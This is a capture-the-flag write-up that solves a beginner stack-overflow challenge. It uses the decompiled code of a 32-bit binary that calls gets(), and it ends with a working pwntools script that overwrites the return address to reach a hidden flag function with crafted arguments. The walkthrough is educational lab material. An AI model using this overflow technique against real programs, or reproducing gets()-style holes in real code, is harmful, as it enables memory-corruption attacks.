## Skills required: basic pwn knowledge but comprehensive understanding of the stack

This challenge *also* serves as a nice introduction to binary exploitation ~and should be beginner-friendly enough~ (it's the challenge with the most solves).

To be frank my pwn ability has always been *trash*, and I loathe myself for forgetting to write writeup immediately after solving the challenge.

<details>
  <summary>Hint 1:</summary>
  Look up the most basic tricks in binary exploitation.
</details>

<details>
  <summary>Hint 2:</summary>
  Solve the more beginner-friendly version of this problem first. How would you adjust your solution to cater the *those* extra elements?
</details>

<details>
  <summary><b>Solution:</b></summary>
  <br/>
  Man, this took a **long** time even I had solved it before.
  
  As always, ghidra can help us reverse this 32-bit executable:
  
```c
void flag(int param_1,int param_2){ // address: 0x080491e2
  char local_50 [64];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 != (FILE *)0x0) {
    fgets(local_50,0x40,local_10);
    if ((param_1 == -0x21524111) && (param_2 == -0x3f212ff3)) {
      printf(local_50);
    }
    return;
  }
  puts("Hurry up and try in on server side.");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
  
void vuln(void){
  char local_bc [180];
  
  gets(local_bc);
  puts(local_bc);
  return;
}

int main(void){
  __gid_t __rgid;
  
  setvbuf(stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("You know who are 0xDiablos: ");
  vuln();
  return 0;
}
```
  
  For the negative numbers in `flag`, they can be understood as `0xdeadbeef` and `0xc0ded00d` this way:
  
  ![ghidra](https://user-images.githubusercontent.com/114584910/197023225-c36d815e-91f8-494a-bac8-38e469b1f767.png)
  
  `gets` is one of the notorious **unsafe function**.
  It's so unsafe that the [CWE entry](https://cwe.mitre.org/data/definitions/242.html) describes it as "inherently dangerous".
  
  `gets` will always write the stack memory with user input until `\n` or `EOF`.
  This means that it can rewrite the return address at the higher address, **to the flag function** which is naturally not called.
  Up to this part it was still easy for me, as this is very common in CTFs as an encouragement for *trashy* players like me to score something in the pwn category.
  
  I can supply 180A and locate the return pointer very easily with pwndbg. It's important to note any other copy higher up on the stack (lower memory address) is *junk*.
  
  ![180A](https://user-images.githubusercontent.com/114584910/197026121-d42ea506-d425-4244-a147-15b8a44278c9.png)
  
  I can now supply 188A followed by `0x080491e2`, if it were the easiest variant. There are a few problems:
  
  - Python seems to implicitly change the non-ASCII letters when I use `r < <(python3 -c 'print(...)')` in pwndbg<br/>I have to save the string to a file and supply the file to the executable
  - ![sigsegv](https://user-images.githubusercontent.com/114584910/197028333-9f785e8e-9a1c-4748-999b-435378c598f5.png)
  
  I tried solving 2 problems (resolving segfault and supplying arguments) at the same time and it took me a long time - should've divided and conquered.
  
  The reason for the segfault is that the ~original~ overwritten EBP is not in the correct range so instructions involving EBP (variable reads/sets) will give trouble.
  We can set EBP to its original value, but there's another segfault:
  
  ![sigsegv2](https://user-images.githubusercontent.com/114584910/197029941-d6714652-7731-426c-a45c-a18d17a33714.png)
  
  After many Youtube videos and research and trial-and-error, I realized that I need the whole stack context.
  To reduce the pain, here's a nice diagram showing how the stack work:
  
  ![what does the stack say](https://www.linuxjournal.com/files/linuxjournal.com/linuxjournal/articles/063/6391/6391f1.jpg)
  
  Namely we need to set *new EBP*+*flag function pointer*+*whatever*+*param1*+*param2*:
  
  My final pwntools code and some stack pics:
  
```py
from pwn import *

r = process('./vuln') # remote(...) # double checked
r.sendafter(b'\n', b"A"*184+p32(0xffffcfec)+p32(0x080491e2)+p32(0x8049318)+p32(0xdeadbeef)+p32(0xc0ded00d)+b"\n")
r.interactive()
```
  
  ![success1](https://user-images.githubusercontent.com/114584910/197021976-65de5233-382a-49cd-bc00-b4ed9bfee15e.png)
  
  ![success2](https://user-images.githubusercontent.com/114584910/197021988-31c788bf-5960-415a-865c-55559c211707.png)
  
  ![success3](https://user-images.githubusercontent.com/114584910/197021991-67a4d070-3803-4e60-a515-99d21de992c9.png)
</details>
